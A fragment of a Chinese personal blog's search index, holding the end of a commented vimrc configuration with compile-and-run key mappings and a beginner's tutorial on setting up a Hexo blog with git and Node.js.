&lt;C-A&gt; &lt;Esc&gt;ggVGY</span></span><br><span class="line"><span class="string">map &lt;F12&gt; gg=G</span></span><br><span class="line"><span class="string">" 选中状态下 Ctrl+c 复制</span></span><br><span class="line"><span class="string">vmap &lt;C-c&gt; "+y</span></span><br><span class="line"><span class="string">"去空行  </span></span><br><span class="line"><span class="string">nnoremap &lt;F4&gt; :g/^\s*$/d&lt;CR&gt; </span></span><br><span class="line"><span class="string">"比较文件  </span></span><br><span class="line"><span class="string">nnoremap &lt;C-F4&gt; :vert diffsplit </span></span><br><span class="line"><span class="string">"新建标签  </span></span><br><span class="line"><span class="string">map &lt;M-F4&gt; :tabnew&lt;CR&gt;  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">" vim-scripts 中的插件 "</span></span><br><span class="line"><span class="string">Plugin 'taglist.vim'</span></span><br><span class="line"><span class="string">"ctags 配置:F3快捷键显示程序中的各种tags，包括变量和函数等。</span></span><br><span class="line"><span class="string">map &lt;F3&gt; :TlistToggle&lt;CR&gt;</span></span><br><span class="line"><span class="string">let Tlist_Use_Right_Window=1</span></span><br><span class="line"><span class="string">let Tlist_Show_One_File=1</span></span><br><span class="line"><span class="string">let Tlist_Exit_OnlyWindow=1</span></span><br><span class="line"><span class="string">let Tlist_WinWidt=25</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"列出当前目录文件  </span></span><br><span class="line"><span class="string">"map &lt;F2&gt; :tabnew .&lt;CR&gt;  </span></span><br><span class="line"><span class="string">"打开树状文件目录  </span></span><br><span class="line"><span class="string">"map &lt;C-F2&gt; \be  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">""将F3设置为开关NERDTree的快捷键</span></span><br><span class="line"><span class="string">"map &lt;F2&gt; :NERDTreeMirror&lt;CR&gt;</span></span><br><span class="line"><span class="string">map &lt;F2&gt; :NERDTreeToggle .&lt;CR&gt;</span></span><br><span class="line"><span class="string">""修改树的显示图标</span></span><br><span class="line"><span class="string">let g:NERDTreeDirArrowExpandable = '+'</span></span><br><span class="line"><span class="string">let g:NERDTreeDirArrowCollapsible = '-'</span></span><br><span class="line"><span class="string">""窗口位置</span></span><br><span class="line"><span class="string">let g:NERDTreeWinPos='left'</span></span><br><span class="line"><span class="string">""窗口尺寸</span></span><br><span class="line"><span class="string">let g:NERDTreeSize=30</span></span><br><span class="line"><span class="string">""窗口是否显示行号</span></span><br><span class="line"><span class="string">let g:NERDTreeShowLineNumbers=1</span></span><br><span class="line"><span class="string">""不显示隐藏文件</span></span><br><span class="line"><span class="string">let g:NERDTreeHidden=0</span></span><br><span class="line"><span class="string">""打开vim时如果没有文件自动打开NERDTree</span></span><br><span class="line"><span class="string">"autocmd vimenter * if !argc()|NERDTree|endif</span></span><br><span class="line"><span class="string">""当NERDTree为剩下的唯一窗口时自动关闭</span></span><br><span class="line"><span class="string">"autocmd bufenter * if (winnr("$") == 1 &amp;&amp; exists("b:NERDTree") &amp;&amp; b:NERDTree.isTabTree()) | q | endif</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"C，C++ 按F5编译运行</span></span><br><span class="line"><span class="string">map &lt;F5&gt; :call CompileRunGcc()&lt;CR&gt;</span></span><br><span class="line"><span class="string">func! CompileRunGcc()</span></span><br><span class="line"><span class="string">    exec "w"</span></span><br><span class="line"><span class="string">    if &amp;filetype == 'c'</span></span><br><span class="line"><span class="string">    exec "!g++ % -o %&lt;"</span></span><br><span class="line"><span class="string">    exec "! ./%&lt;"</span></span><br><span class="line"><span class="string">    elseif &amp;filetype == 'cpp'</span></span><br><span class="line"><span class="string">    exec "!g++ % -o %&lt;"</span></span><br><span class="line"><span class="string">    exec "! ./%&lt;"</span></span><br><span class="line"><span class="string">    elseif &amp;filetype == 'java' </span></span><br><span class="line"><span class="string">    exec "!javac %" </span></span><br><span class="line"><span class="string">    exec "!java %&lt;"</span></span><br><span class="line"><span class="string">    elseif &amp;filetype == 'sh'</span></span><br><span class="line"><span class="string">    :!./%</span></span><br><span class="line"><span class="string">    elseif &amp;filetype == 'py'</span></span><br><span class="line"><span class="string">    exec "!python %"</span></span><br><span class="line"><span class="string">    exec "!python %&lt;"</span></span><br><span class="line"><span class="string">    endif</span></span><br><span class="line"><span class="string">endfunc</span></span><br><span class="line"><span class="string">"C,C++的调试</span></span><br><span class="line"><span class="string">map &lt;F8&gt; :call Rungdb()&lt;CR&gt;</span></span><br><span class="line"><span class="string">func! Rungdb()</span></span><br><span class="line"><span class="string">    exec "w"</span></span><br><span class="line"><span class="string">    exec "!g++ % -g -o %&lt;"</span></span><br><span class="line"><span class="string">    exec "!gdb ./%&lt;"</span></span><br><span class="line"><span class="string">endfunc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">"""</span></span><br><span class="line"><span class="string">""实用设置</span></span><br><span class="line"><span class="string">"""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""""""</span><span class="string">""</span></span><br><span class="line"><span class="string">" 设置当文件被改动时自动载入</span></span><br><span class="line"><span class="string">set autoread</span></span><br><span class="line"><span class="string">"</span> quickfix模式</span><br><span class="line">autocmd FileType c,cpp map &lt;buffer&gt; &lt;leader&gt;&lt;space&gt; :w&lt;cr&gt;:make&lt;cr&gt;</span><br><span class="line"><span class="string">"代码补全 </span></span><br><span class="line"><span class="string">set completeopt=preview,menu </span></span><br><span class="line"><span class="string">"</span> set completeopt=longest,menu</span><br><span class="line"><span class="string">"允许插件  </span></span><br><span class="line"><span class="string">filetype plugin on</span></span><br><span class="line"><span class="string">"</span>共享剪贴板  </span><br><span class="line">set clipboard+=unnamed </span><br><span class="line"><span class="string">"从不备份  </span></span><br><span class="line"><span class="string">set nobackup</span></span><br><span class="line"><span class="string">"</span>make 运行</span><br><span class="line">:set makeprg=g++\ -Wall\ \ %</span><br><span class="line"><span class="string">"自动保存</span></span><br><span class="line"><span class="string">set autowrite</span></span><br><span class="line"><span class="string">set ruler                   "</span> 打开状态栏标尺</span><br><span class="line">set cursorline              <span class="string">" 突出显示当前行</span></span><br><span class="line"><span class="string">set magic                   "</span> 设置魔术</span><br><span class="line">set guioptions-=T           <span class="string">" 隐藏工具栏</span></span><br><span class="line"><span class="string">set guioptions-=m           "</span> 隐藏菜单栏</span><br><span class="line"><span class="string">"set statusline=\ %&lt;%F[%1*%M%*%n%R%H]%=\ %y\ %0(%&#123;&amp;fileformat&#125;\ %&#123;&amp;encoding&#125;\ %c:%l/%L%)\</span></span><br><span class="line"><span class="string">"</span> 设置在状态行显示的信息</span><br><span class="line">set foldcolumn=<span class="number">0</span></span><br><span class="line">set foldmethod=indent </span><br><span class="line">set foldlevel=<span class="number">3</span> </span><br><span class="line">set foldenable              <span class="string">" 开始折叠</span></span><br><span class="line"><span class="string">"</span> 不要使用vi的键盘模式，而是vim自己的</span><br><span class="line">set nocompatible</span><br><span class="line"><span class="string">" 语法高亮</span></span><br><span class="line"><span class="string">set syntax=on</span></span><br><span class="line"><span class="string">"</span> 去掉输入错误的提示声音</span><br><span class="line">set noeb</span><br><span class="line"><span class="string">" 在处理未保存或只读文件的时候，弹出确认</span></span><br><span class="line"><span class="string">set confirm</span></span><br><span class="line"><span class="string">"</span> 自动缩进</span><br><span class="line">set autoindent</span><br><span class="line">set cindent</span><br><span class="line"><span class="string">" Tab键的宽度</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">"</span> 统一缩进为<span class="number">4</span></span><br><span class="line">set softtabstop=<span class="number">4</span></span><br><span class="line">set shiftwidth=<span class="number">4</span></span><br><span class="line"><span class="string">" 不要用空格代替制表符</span></span><br><span class="line"><span class="string">set noexpandtab</span></span><br><span class="line"><span class="string">"</span> 在行和段开始处使用制表符</span><br><span class="line">set smarttab</span><br><span class="line"><span class="string">" 显示行号</span></span><br><span class="line"><span class="string">set number</span></span><br><span class="line"><span class="string">"</span> 历史记录数</span><br><span class="line">set history=<span class="number">1000</span></span><br><span class="line"><span class="string">"禁止生成临时文件</span></span><br><span class="line"><span class="string">set nobackup</span></span><br><span class="line"><span class="string">set noswapfile</span></span><br><span class="line"><span class="string">"</span>搜索忽略大小写</span><br><span class="line">set ignorecase</span><br><span class="line"><span class="string">"搜索逐字符高亮</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">set incsearch</span></span><br><span class="line"><span class="string">"</span>行内替换</span><br><span class="line">set gdefault</span><br><span class="line"><span class="string">"编码设置</span></span><br><span class="line"><span class="string">set enc=utf-8</span></span><br><span class="line"><span class="string">set fencs=utf-8,ucs-bom,shift-jis,gb18030,gbk,gb2312,cp936</span></span><br><span class="line"><span class="string">"</span>语言设置</span><br><span class="line">set langmenu=zh_CN.UTF<span class="number">-8</span></span><br><span class="line">set helplang=cn</span><br><span class="line"><span class="string">" 我的状态行显示的内容（包括文件类型和解码）</span></span><br><span class="line"><span class="string">"</span>set statusline=%F%m%r%h%w\ [FORMAT=%&#123;&amp;ff&#125;]\ [TYPE=%Y]\ [POS=%l,%v][%p%%]\ %&#123;strftime(\<span class="string">"%d/%m/%y\ -\ %H:%M\")&#125;</span></span><br><span class="line"><span class="string">"</span>set statusline=[%F]%y%r%m%*%=[Line:%l/%L,Column:%c][%p%%]</span><br><span class="line"><span class="string">" 总是显示状态行</span></span><br><span class="line"><span class="string">set laststatus=2</span></span><br><span class="line"><span class="string">"</span> 命令行（在状态行下）的高度，默认为<span class="number">1</span>，这里是<span class="number">2</span></span><br><span class="line">set cmdheight=<span class="number">2</span></span><br><span class="line"><span class="string">" 侦测文件类型</span></span><br><span class="line"><span class="string">filetype on</span></span><br><span class="line"><span class="string">"</span> 载入文件类型插件</span><br><span class="line">filetype plugin on</span><br><span class="line"><span class="string">" 为特定文件类型载入相关缩进文件</span></span><br><span class="line"><span class="string">filetype indent on</span></span><br><span class="line"><span class="string">"</span> 保存全局变量</span><br><span class="line">set viminfo+=!</span><br><span class="line"><span class="string">" 带有如下符号的单词不要被换行分割</span></span><br><span class="line"><span class="string">set iskeyword+=_,$,@,%,#,-</span></span><br><span class="line"><span class="string">"</span> 字符间插入的像素行数目</span><br><span class="line">set linespace=<span class="number">0</span></span><br><span class="line"><span class="string">" 增强模式中的命令行自动完成操作</span></span><br><span class="line"><span class="string">set wildmenu</span></span><br><span class="line"><span class="string">"</span> 使回格键（backspace）正常处理indent, eol, start等</span><br><span class="line">set backspace=<span class="number">2</span></span><br><span class="line"><span class="string">" 允许backspace和光标键跨越行边界</span></span><br><span class="line"><span class="string">set whichwrap+=&lt;,&gt;,h,l</span></span><br><span class="line"><span class="string">"</span> 可以在buffer的任何地方使用鼠标（类似office中在工作区双击鼠标定位）</span><br><span class="line">set mouse=a</span><br><span class="line">set selection=exclusive</span><br><span class="line">set selectmode=mouse,key</span><br><span class="line"><span class="string">" 通过使用: commands命令，告诉我们文件的哪一行被改变过</span></span><br><span class="line"><span class="string">set report=0</span></span><br><span class="line"><span class="string">"</span> 在被分割的窗口间显示空白，便于阅读</span><br><span class="line">set fillchars=vert:\ ,stl:\ ,stlnc:\</span><br><span class="line"><span class="string">" 高亮显示匹配的括号</span></span><br><span class="line"><span class="string">set showmatch</span></span><br><span class="line"><span class="string">"</span> 匹配括号高亮的时间（单位是十分之一秒）</span><br><span class="line">set matchtime=<span class="number">1</span></span><br><span class="line"><span class="string">" 光标移动到buffer的顶部和底部时保持3行距离</span></span><br><span class="line"><span class="string">set scrolloff=3</span></span><br><span class="line"><span class="string">"</span> 为C程序提供自动缩进</span><br><span class="line">set smartindent</span><br><span class="line"><span class="string">" 高亮显示普通txt文件（需要txt.vim脚本）</span></span><br><span class="line"><span class="string">au BufRead,BufNewFile *  setfiletype txt</span></span><br><span class="line"><span class="string">"</span>自动补全</span><br><span class="line">:inoremap ( ()&lt;ESC&gt;i</span><br><span class="line">:inoremap ) &lt;c-r&gt;=ClosePair(<span class="string">')'</span>)&lt;CR&gt;</span><br><span class="line"><span class="string">":inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O</span></span><br><span class="line"><span class="string">"</span>:inoremap &#125; &lt;c-r&gt;=ClosePair(<span class="string">'&#125;'</span>)&lt;CR&gt;</span><br><span class="line">:inoremap [ []&lt;ESC&gt;i</span><br><span class="line">:inoremap ] &lt;c-r&gt;=ClosePair(<span class="string">']'</span>)&lt;CR&gt;</span><br><span class="line">:inoremap <span class="string">" "</span><span class="string">"&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">:inoremap ' ''&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">function! ClosePair(char)</span></span><br><span class="line"><span class="string">    if getline('.')[col('.') - 1] == a:char</span></span><br><span class="line"><span class="string">    return "</span>\&lt;Right&gt;<span class="string">"</span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">    return a:char</span></span><br><span class="line"><span class="string">    endif</span></span><br><span class="line"><span class="string">endfunction</span></span><br><span class="line"><span class="string">filetype plugin indent on </span></span><br><span class="line"><span class="string">"</span>打开文件类型检测, 加了这句才可以用智能补全</span><br><span class="line">set completeopt=longest,menu</span><br><span class="line"></span><br><span class="line"><span class="string">" ctages 插件</span></span><br><span class="line"><span class="string">set tags=/home/rpz/tags</span></span><br></pre></td></tr></table></figure>







]]></content>
  </entry>
  <entry>
    <title>简单搭建个属于你的个人博客</title>
    <url>/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<hr>
<p>没想到都大三老狗了，还是个新人的水准，这就是菜吧。但还是要努力学习呀，希望有个好的结果！</p>
<p>废话不多说，开始小白的搭建博客教程吧~</p>
<h4 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git"></a>1.安装git</h4><p><a href="https://git-scm.com/downloads" target="_blank" rel="noopener">git官网传送门</a></p>
<h4 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h4><p><a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js官网传送门</a></p>
<h4 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3.安装Hexo"></a>3.安装Hexo</h4><p>Hexo拥有丰富的主题，比较推荐</p>
<p>win+R  cmd 输入以下命令，安装hexo包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo</span><br></pre></td></tr></table></figure>

<h4 id="4-建立博客所在文件"><a href="#4-建立博客所在文件" class="headerlink" title="4.建立博客所在文件"></a>4.建立博客所在文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init chj</span><br><span class="line">cd chj</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>过程如下图：</p>
<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/1.png" alt="1234"></p>
<p>文件下的目录如下：</p>
<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/cmd.jpg" alt="1234"></p>
<h4 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h4><p>这是网站的配值信息，可以在此配置大部分的参数。</p>
<h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>这是存放用户资源的地方，文章会存放在其中的_posts文件夹下，而一些标签、归档则是在source文件夹下。</p>
<h4 id="themes"><a href="#themes" class="headerlink" title="themes"></a>themes</h4><p>主题文件夹，Hexo 会根据主题来生成静态页面，博客所用的各种主题都存放在此目录下。</p>
<h4 id="5-git的基本操作"><a href="#5-git的基本操作" class="headerlink" title="5.git的基本操作"></a>5.git的基本操作</h4><p>安装上诉步骤简单部署好以后，输入以下命令，然后本地localhost:4000访问，就可以看到自己的博客了~</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/18/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E5%B1%9E%E4%BA%8E%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/4000.png" alt="1234"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;email@example.com&quot;</span><br></pre></td></tr></table></figure>

<p>因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。你也许会担心，如果有人故意冒充别人怎么办？这个不必担心，首先我们相信大家都是善良无知的群众，其次，真的有冒充的也是有办法可查的。</p>
<p>注意<code>git config</code>命令的<code>--global</code>参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
]]></content>
  </entry>
</search>
